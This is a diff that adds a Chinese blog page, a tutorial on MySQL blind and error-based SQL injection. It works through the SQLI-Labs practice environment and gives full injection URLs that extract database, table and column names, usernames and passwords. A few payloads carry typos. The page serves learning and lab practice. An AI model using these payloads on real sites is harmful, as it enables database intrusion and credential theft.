@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      SQL注入全解 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>SQL注入全解</h2>
+  <p class="post-date">2019-03-06</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>Tip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">SQLI-Labs</a>相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.</p>
+<table>
+<thead>
+<tr>
+<th>一、布尔盲注</th>
+<th>二、报错注入</th>
+<th>三、时间盲注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>left()函数</td>
+<td>count()&amp;floor(rand())&amp;group by</td>
+<td>sleep()函数</td>
+</tr>
+<tr>
+<td>ascii()和substr函数</td>
+<td>EXP()函数</td>
+<td>if(condition,true,false)</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>ord()函数&amp;mid()函数</td>
+<td>bigint溢出</td>
+<td></td>
+</tr>
+<tr>
+<td>regexp正则</td>
+<td>xpath报错注入:extractvalue()、updataxml()</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="一、布尔盲注"><a href="#一、布尔盲注" class="headerlink" title="一、布尔盲注"></a>一、布尔盲注</h1><h2 id="1-1-left"><a href="#1-1-left" class="headerlink" title="1.1.left()"></a>1.1.left()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式:left(str,1)&gt;5</span><br></pre></td></tr></table></figure>
+<p>解析:str是字符串,可能是版本号,可能是数据库名等;数字1:指的是从字符串中获取第一个字符,如果想获取第二个字符,直接修改次数字就行,但,注意:后面比较的数字要写上我们探测的第一个字符信息.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例:</span><br><span class="line">Database()=<span class="string">&#x27;security&#x27;</span>实际值;</span><br><span class="line">Left(database(),1)&gt;<span class="string">&#x27;s&#x27;</span> 没有爆错并测出第一个字符是<span class="string">&#x27;s&#x27;</span></span><br><span class="line">Left(database(),2)&gt;<span class="string">&#x27;sh&#x27;</span> 需要加第一个字符,否则会爆错的;注意啦啦啦;</span><br></pre></td></tr></table></figure>
+<h3 id="1-1-1-爆库"><a href="#1-1-1-爆库" class="headerlink" title="1.1.1.爆库"></a>1.1.1.爆库</h3><p>1.1.1.1.猜测第一个字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:猜测第一个字符是否大于<span class="string">&#x27;i&#x27;</span>字符</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left(database(),1)&gt;&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/sqlall/bool1.jpg" alt="bool1"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:确定第一个字符是s</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left(database(),1)=&#x27;s&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p>1.1.1.2.猜解第二个字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:必须添加第一个字符,以便进行猜解第二个字符;</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left(database(),2)=&#x27;se&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:没有第九个字符,会直接报错,如下面URL.</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left(database(),9)&gt;&#x27;securitya&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<h3 id="1-1-2-爆库"><a href="#1-1-2-爆库" class="headerlink" title="1.1.2.爆库"></a>1.1.2.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select schema_name from information_schema.schemata limit</span></span><br><span class="line"><span class="string">0,1),1)=&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/sqlall/bool2.jpg" alt="bool2"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select schema_name from information_schema.schemata limit</span></span><br><span class="line"><span class="string">0,1),12)=&#x27;information_&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/sqlall/bool3.jpg" alt="bool3"></p>
+<p>1.1.2.1.第一张表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 0,1),1)=&#x27;e&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool4.jpg" alt="bool4"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 0,1),3)=‘ema’--+</span></span><br></pre></td></tr></table></figure>
+
+<p>1.1.2.2.第二张表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 1,1),1)=&#x27;r&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool5.jpg" alt="bool5"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 1,1),2)=&#x27;re&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>其他测试可自行继续猜解其他表,其中包含:users等表,具体不作实操;</p>
+<h3 id="1-1-3-爆表"><a href="#1-1-3-爆表" class="headerlink" title="1.1.3.爆表"></a>1.1.3.爆表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select column_name from information_schema.columns where</span></span><br><span class="line"><span class="string">table_name=&#x27;users&#x27; limit 0,1),1)=&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool6.jpg" alt="bool6"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select column_name from information_schema.columns where</span></span><br><span class="line"><span class="string">table_name=&#x27;users&#x27; limit 0,1),2)=&#x27;id&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>其他字段名:id、username、password</p>
+<h3 id="1-1-4-爆数据"><a href="#1-1-4-爆数据" class="headerlink" title="1.1.4.爆数据"></a>1.1.4.爆数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:注意:第一个username是D,大写字符,但是这里无法区分大小写;</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select username from security.users limit 0,1),1)=&#x27;d&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool7.jpg" alt="bool7"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and left((select username from security.users limit 0,1),2)=&#x27;du&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>建议:这里不要使用此函数进行猜解,因为无法判断字符哪里是大写哪里是小写的字符;建议使用下面ascii码来判断字符信息;其他部分就不继续猜解,因为字符中存在大小写区分.</p>
+<h2 id="1-2-ascii-amp-substr"><a href="#1-2-ascii-amp-substr" class="headerlink" title="1.2.ascii()&amp;substr()"></a>1.2.ascii()&amp;substr()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式:</span><br><span class="line">ascii(string)&gt;ascii码           ascii转换作用,并与外部进行比较;</span><br><span class="line">substr(string,start,length)  从字符串开始的数字,取出长度为length长度的字符;</span><br></pre></td></tr></table></figure>
+
+<p>下面就利用此paylaod进行获取库中表名:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables <span class="built_in">where</span> tables_schema=database() <span class="built_in">limit</span> 0,1),1,1))=101</span><br><span class="line">//注意：database()已经通过以上方式可以获得;</span><br></pre></td></tr></table></figure>
+
+<p>ASCII码对照表:<a target="_blank" rel="noopener" href="http://ascii.911cha.com/">http://ascii.911cha.com/</a></p>
+<h3 id="1-2-1-爆库"><a href="#1-2-1-爆库" class="headerlink" title="1.2.1.爆库"></a>1.2.1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select database()),1,1))=115 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool8.jpg" alt="bool8"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其他URL:101—&gt;<span class="string">&#x27;e&#x27;</span></span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select database()),2,1))=101 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>注意:超出字符长度时,设置最小ascii字符,也会报错,说明字符已经猜解完毕</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select database()),9,1))&gt;65 --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-2-爆表"><a href="#1-2-2-爆表" class="headerlink" title="1.2.2.爆表"></a>1.2.2.爆表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:101—&gt;<span class="string">&#x27;e&#x27;</span></span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool9.jpg" alt="bool9"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 0,1),2,1))=109 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>和上面一样修改部分数字即可;表名:users、emails等:</p>
+<h3 id="1-2-3-爆字段"><a href="#1-2-3-爆字段" class="headerlink" title="1.2.3.爆字段"></a>1.2.3.爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select column_name from information_schema.columns where</span></span><br><span class="line"><span class="string">table_name=&#x27;users&#x27; limit 0,1),1,1))=105 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool10.jpg" alt="bool10"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ascii(substr((select column_name from information_schema.columns where</span></span><br><span class="line"><span class="string">table_name=&#x27;users&#x27; limit 0,1),2,1))=100 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>其他部分不作测试,列名:id、admin、username、password等,我们主要以username和password两列为主;</p>
+<h2 id="1-3-ord-amp-mid"><a href="#1-3-ord-amp-mid" class="headerlink" title="1.3.ord()&amp;mid()"></a>1.3.ord()&amp;mid()</h2><p>通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">格式:</span><br><span class="line">ord(string)     对获取的字符进行ascii码转换;</span><br><span class="line">mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)    截取字段中第一行的第一个字符;</span><br><span class="line">mid(column_name,start[,length])</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-1-爆库"><a href="#1-3-1-爆库" class="headerlink" title="1.3.1.爆库"></a>1.3.1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:第一个字符的ASCII码</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ord(mid((select database()),1,1))=115--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool12.jpg" alt="bool12"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and ord(mid((select database()),2,1))=101--+</span></span><br></pre></td></tr></table></figure>
+
+<p>后续的注入语句可以参考上面.</p>
+<h2 id="1-4-regexp正则"><a href="#1-4-regexp正则" class="headerlink" title="1.4.regexp正则"></a>1.4.regexp正则</h2><p>通过上面方法我们已经获取数据库和表,此时就是获取字段信息;而,正则表达式法,主要是利用布尔型进行模糊匹配.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式:regexp <span class="string">&#x27;^…&#x27;</span></span><br><span class="line">regexp ‘^…<span class="string">&#x27;  and 1=(select 1 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and column_name regexp &#x27;</span>^us[a-z]<span class="string">&#x27; limit 0,1)</span></span><br><span class="line"><span class="string">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-1-爆库"><a href="#1-4-1-爆库" class="headerlink" title="1.4.1.爆库"></a>1.4.1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and 1=(select 1 and database() regexp &#x27;^[a-z]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool13.jpg" alt="bool13"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and 1=(select 1 and database() regexp &#x27;^[s-s]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-2-爆表"><a href="#1-4-2-爆表" class="headerlink" title="1.4.2.爆表"></a>1.4.2.爆表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and</span></span><br><span class="line"><span class="string">table_name regexp &#x27;^[a-s]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool14.jpg" alt="bool14"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and</span></span><br><span class="line"><span class="string">table_name regexp &#x27;^[e-e]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-3-爆字段"><a href="#1-4-3-爆字段" class="headerlink" title="1.4.3.爆字段"></a>1.4.3.爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and</span></span><br><span class="line"><span class="string">column_name regexp &#x27;^[a-z]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>其他部分请自行继续.</p>
+<h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><h2 id="2-1-count-amp-floor-amp-group-by"><a href="#2-1-count-amp-floor-amp-group-by" class="headerlink" title="2.1.count&amp;floor&amp;group by"></a>2.1.count&amp;floor&amp;group by</h2><p>count(*)、floor(rand(0)*2)和group by的报错原理已经进行分析,可以参考后续:《Mysql注入之报错注入学习与分析-&gt;floor、count、group by》具体的语句构造可以参考下面的方式进行..这里省略了注入判断部分.</p>
+<h3 id="2-1-0-数据库"><a href="#2-1-0-数据库" class="headerlink" title="2.1.0.数据库"></a>2.1.0.数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from</span></span><br><span class="line"><span class="string">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool15.jpg" alt="bool15"></p>
+<h3 id="2-1-1-爆库"><a href="#2-1-1-爆库" class="headerlink" title="2.1.1.爆库"></a>2.1.1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select schema_name from </span></span><br><span class="line"><span class="string">information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool16.jpg" alt="bool16"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select schema_name from</span></span><br><span class="line"><span class="string">information_schema.schemata limit 6,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-2-爆表"><a href="#2-1-2-爆表" class="headerlink" title="2.1.2.爆表"></a>2.1.2.爆表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select table_name from</span></span><br><span class="line"><span class="string">information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x3a,floor(rand(0)*2))a from</span></span><br><span class="line"><span class="string">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool17.jpg" alt="bool17"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select table_name from</span></span><br><span class="line"><span class="string">information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x3a,floor(rand(0)*2))a from</span></span><br><span class="line"><span class="string">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-3-爆字段"><a href="#2-1-3-爆字段" class="headerlink" title="2.1.3.爆字段"></a>2.1.3.爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select column_name from</span></span><br><span class="line"><span class="string">information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns</span></span><br><span class="line"><span class="string">group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool18.jpg" alt="bool18"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select column_name from</span></span><br><span class="line"><span class="string">information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns</span></span><br><span class="line"><span class="string">group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-4-爆数据"><a href="#2-1-4-爆数据" class="headerlink" title="2.1.4.爆数据"></a>2.1.4.爆数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:这里payload只能爆出一列字段信息</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,scount(*),concat(0x3a,(select username from security.users limit</span></span><br><span class="line"><span class="string">0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool19.jpg" alt="bool19"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select 1,count(*),concat(0x3a,(select password from security.users limit</span></span><br><span class="line"><span class="string">0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-EXP-报错"><a href="#2-2-EXP-报错" class="headerlink" title="2.2.EXP()报错"></a>2.2.EXP()报错</h2><p>EXP(x) 返回值e（自然对数的底）的x次方;如果不懂的,可以看这篇文章:《Mysql注入之exp报错注入》</p>
+<p>URL：备注：使用EXP函数进行报错时，必须得知列长，如：这里是id、username、password三列</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+	</span></span><br></pre></td></tr></table></figure>
+
